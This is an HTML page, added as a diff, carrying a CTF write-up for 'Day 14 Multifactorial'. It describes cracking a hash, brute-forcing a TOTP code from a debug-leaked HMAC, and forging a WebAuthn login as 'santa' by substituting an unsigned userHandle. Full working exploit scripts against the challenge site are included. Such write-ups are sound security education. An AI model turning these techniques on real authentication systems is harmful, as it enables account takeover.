@@ -1,0 +1,492 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-12-02-advent-of-ctf-2025/day-14.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>Day 14 Multifactorial - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#day-14-multifactorial" class="nav-link">Day 14 Multifactorial</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="day-14-multifactorial">Day 14 Multifactorial</h1>
+<p>Step 1: hidden sha1 in the source code: <code>bf33632dd9668787878890cb4fbb54261b6b7571</code>, crack it in <a href="https://crackstation.net/">https://crackstation.net/</a> leads to <code>northpole123</code>. It is the answer.</p>
+<p>Step 2: the <code>/api/something-you-have-verify?debug=0</code> endpoint has argument <code>debug</code>, if we set it to <code>1</code>, we can have <code>hmac</code> and <code>serverTime</code> in the response. The secret key is shown in the source code: <code>17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49</code>. According to the hint:</p>
+<pre class="highlight"><code>Stage 2: HMAC = sha256(secret_key, message). The message is just the six-digit TOTP code (and there are only 999,999 possibilities of that!).</code></pre>
+<p>We can find correct TOTP code by bruteforcing:</p>
+<pre class="highlight"><code class="language-python">#!/usr/bin/env python3
+import hashlib
+import hmac
+import requests
+import json
+import time
+
+def brute_force_totp(hmac_hex, secret_key):
+    """Brute force TOTP code given HMAC and secret key."""
+    target_hmac = bytes.fromhex(hmac_hex)
+
+    for code in range(1000000):
+        code_str = f"{code:06d}"
+        # Compute HMAC-SHA256(secret_key, code_str)
+        h = hmac.new(secret_key.encode(), code_str.encode(), hashlib.sha256)
+        if h.digest() == target_hmac:
+            return code_str
+    return None
+
+def main():
+    # Get session
+    resp = requests.post(
+        "https://multifactorial.csd.lol/api/something-you-know-check",
+        json={"password": "northpole123"}
+    )
+    session_cookie = resp.headers.get('Set-Cookie', '').split(';')[0]
+
+    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
+
+    # Get current HMAC with debug=1
+    debug_resp = requests.post(
+        "https://multifactorial.csd.lol/api/something-you-have-verify?debug=1",
+        headers=headers,
+        json={"code": "000000"}  # Submit dummy code
+    )
+
+    debug_data = debug_resp.json()
+    hmac_hex = debug_data["hmac"]
+    server_time = debug_data["serverTime"]
+
+    print(f"HMAC: {hmac_hex}")
+    print(f"Time: {server_time}")
+
+    # Try ORACLE_KEY as secret
+    secret_key = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"
+
+    print(f"Brute forcing with secret: {secret_key}")
+    start = time.time()
+    code = brute_force_totp(hmac_hex, secret_key)
+    elapsed = time.time() - start
+
+    if code:
+        print(f"Found code: {code} (took {elapsed:.2f}s)")
+
+        # Test the code
+        verify_resp = requests.post(
+            "https://multifactorial.csd.lol/api/something-you-have-verify",
+            headers=headers,
+            json={"code": code}
+        )
+
+        print(f"Verify response: {verify_resp.status_code}")
+        print(f"Verify data: {verify_resp.text}")
+    else:
+        print(f"No code found (took {elapsed:.2f}s)")
+
+if __name__ == "__main__":
+    main()</code></pre>
+<p>Step 3. We need to use WebAuthn to authenticate, while faking as santa. First, we need a software WebAuthn implementation <code>SoftWebauthnDevice</code> from <a href="https://raw.githubusercontent.com/bodik/soft-webauthn/refs/heads/master/soft_webauthn.py">https://raw.githubusercontent.com/bodik/soft-webauthn/refs/heads/master/soft_webauthn.py</a>. Then, we can:</p>
+<ol>
+<li>request registration options using <code>attacker</code> as name</li>
+<li>create credential using <code>SoftWebauthnDevice</code></li>
+<li>register the credential</li>
+<li>request authentication option, override the userHandle for <code>santa</code></li>
+<li>authenticate as <code>santa</code> and access admin panel</li>
+</ol>
+<pre class="highlight"><code class="language-python">#!/usr/bin/env python3
+import hashlib
+import hmac
+import requests
+import json
+import time
+import base64
+from soft_webauthn import SoftWebauthnDevice
+
+def brute_force_totp(hmac_hex, secret_key):
+    target_hmac = bytes.fromhex(hmac_hex)
+    for code in range(1000000):
+        code_str = f"{code:06d}"
+        h = hmac.new(secret_key.encode(), code_str.encode(), hashlib.sha256)
+        if h.digest() == target_hmac:
+            return code_str
+    return None
+
+def main():
+    print("=== Exploiting WebAuthn userHandle vulnerability (16-byte version) ===")
+
+    # Stage 1: Password
+    resp = requests.post(
+        "https://multifactorial.csd.lol/api/something-you-know-check",
+        json={"password": "northpole123"}
+    )
+    session_cookie = resp.headers.get('Set-Cookie', '').split(';')[0]
+    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
+
+    # Stage 2: TOTP
+    debug_resp = requests.post(
+        "https://multifactorial.csd.lol/api/something-you-have-verify?debug=1",
+        headers=headers,
+        json={"code": "000000"}
+    )
+    hmac_hex = debug_resp.json()["hmac"]
+
+    secret_key = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"
+    code = brute_force_totp(hmac_hex, secret_key)
+
+    verify_resp = requests.post(
+        "https://multifactorial.csd.lol/api/something-you-have-verify",
+        headers=headers,
+        json={"code": code}
+    )
+
+    if verify_resp.status_code != 200:
+        print("TOTP failed")
+        return
+
+    print("Passed TOTP")
+
+    # Stage 3: WebAuthn
+
+    # First, register a passkey with a test name
+    test_name = "attacker"
+    print(f"\n1. Registering passkey for: {test_name}")
+
+    # Get registration options
+    reg_options_resp = requests.post(
+        "https://multifactorial.csd.lol/api/webauthn/register/options",
+        headers=headers,
+        json={"name": test_name}
+    )
+
+    if reg_options_resp.status_code != 200:
+        print(f"Registration options failed: {reg_options_resp.text}")
+        return
+
+    reg_options = reg_options_resp.json()
+    print(f"Got registration options")
+
+    # The server returns challenge as base64url string
+    # We need to convert it to bytes for SoftWebauthnDevice
+    challenge_b64url = reg_options['publicKey']['challenge']
+    # Convert from base64url to bytes
+    challenge = base64.urlsafe_b64decode(challenge_b64url + '==')
+    reg_options['publicKey']['challenge'] = challenge
+
+    # Also convert user.id from base64url to bytes
+    user_id_b64url = reg_options['publicKey']['user']['id']
+    user_id = base64.urlsafe_b64decode(user_id_b64url + '==')
+    reg_options['publicKey']['user']['id'] = user_id
+
+    # Create software authenticator
+    device = SoftWebauthnDevice()
+
+    # Create credential
+    origin = "https://multifactorial.csd.lol"
+    credential = device.create(reg_options, origin)
+
+    # Prepare registration verify request
+    registration_request = {
+        "name": test_name,
+        "id": base64.urlsafe_b64encode(credential['rawId']).decode().rstrip('='),
+        "rawId": base64.urlsafe_b64encode(credential['rawId']).decode().rstrip('='),
+        "type": credential['type'],
+        "response": {
+            "clientDataJSON": base64.urlsafe_b64encode(credential['response']['clientDataJSON']).decode().rstrip('='),
+            "attestationObject": base64.urlsafe_b64encode(credential['response']['attestationObject']).decode().rstrip('=')
+        }
+    }
+
+    # Send registration
+    reg_verify_resp = requests.post(
+        "https://multifactorial.csd.lol/api/webauthn/register/verify",
+        headers=headers,
+        json=registration_request
+    )
+
+    if reg_verify_resp.status_code != 200:
+        print(f"Registration failed: {reg_verify_resp.status_code}, {reg_verify_resp.text}")
+        return
+
+    reg_data = reg_verify_resp.json()
+    print(f"Registration successful!")
+    print(f"Credential ID: {reg_data.get('credId', 'N/A')}")
+    print(f"UserHandle returned: {reg_data.get('userHandle', 'N/A')}")
+
+    # Now we have a registered passkey
+    # Let's get authentication options
+    print("\n2. Getting authentication options...")
+    auth_options_resp = requests.post(
+        "https://multifactorial.csd.lol/api/webauthn/auth/options",
+        headers=headers
+    )
+
+    if auth_options_resp.status_code != 200:
+        print(f"Auth options failed: {auth_options_resp.status_code}, {auth_options_resp.text}")
+        return
+
+    auth_options = auth_options_resp.json()
+    print(f"Got authentication options")
+
+    # Convert challenge from base64url to bytes
+    auth_challenge_b64url = auth_options['publicKey']['challenge']
+    auth_challenge = base64.urlsafe_b64decode(auth_challenge_b64url + '==')
+    auth_options['publicKey']['challenge'] = auth_challenge
+
+    # Generate authentication assertion
+    print("\n3. Generating authentication assertion...")
+    assertion = device.get(auth_options, origin)
+
+    # Compute santa's userHandle (FIRST 16 BYTES of SHA256 of "santa" base64url encoded)
+    santa_sha256 = hashlib.sha256(b"santa").digest()
+    santa_first_16 = santa_sha256[:16]
+    santa_user_handle = base64.urlsafe_b64encode(santa_first_16).decode().rstrip('=')
+    print(f"Santa userHandle (first 16 bytes): {santa_user_handle}")
+
+    # Also compute full SHA256 for comparison
+    santa_full = base64.urlsafe_b64encode(santa_sha256).decode().rstrip('=')
+    print(f"Santa userHandle (full SHA256): {santa_full}")
+
+    # Modify the assertion to use santa's userHandle
+    # This is the exploit: userHandle is not signed!
+    print("\n4. Modifying assertion to use santa's userHandle...")
+
+    # Try with first 16 bytes
+    auth_request = {
+        "id": base64.urlsafe_b64encode(assertion['rawId']).decode().rstrip('='),
+        "rawId": base64.urlsafe_b64encode(assertion['rawId']).decode().rstrip('='),
+        "type": assertion['type'],
+        "userHandle": santa_user_handle,  # EXPLOIT: Use santa's userHandle (first 16 bytes)
+        "response": {
+            "authenticatorData": base64.urlsafe_b64encode(assertion['response']['authenticatorData']).decode().rstrip('='),
+            "clientDataJSON": base64.urlsafe_b64encode(assertion['response']['clientDataJSON']).decode().rstrip('='),
+            "signature": base64.urlsafe_b64encode(assertion['response']['signature']).decode().rstrip('=')
+        }
+    }
+
+    print(f"Sending authentication with santa userHandle (first 16 bytes)...")
+    auth_verify_resp = requests.post(
+        "https://multifactorial.csd.lol/api/webauthn/auth/verify",
+        headers=headers,
+        json=auth_request
+    )
+
+    print(f"\nAuthentication response: {auth_verify_resp.status_code}")
+    print(f"Response: {auth_verify_resp.text}")
+
+    if auth_verify_resp.status_code == 200:
+        auth_data = auth_verify_resp.json()
+        print(f"Message: {auth_data.get('message', 'N/A')}")
+
+        if "santa" in auth_data.get('message', '').lower():
+            print("\nSUCCESS! Authenticated as santa!")
+
+            # Now try to access /admin
+            print("\n5. Accessing /admin as santa...")
+            admin_resp = requests.get(
+                "https://multifactorial.csd.lol/admin",
+                headers=headers
+            )
+
+            print(f"Admin page status: {admin_resp.status_code}")
+            if admin_resp.status_code == 200:
+                print("\n=== FLAG FOUND ===")
+                print(admin_resp.text)
+            else:
+                print(f"Admin page: {admin_resp.text[:500]}")
+        else:
+            print("\nAuthenticated but not as santa")
+    else:
+        print("\nAuthentication failed")
+
+if __name__ == "__main__":
+    main()</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
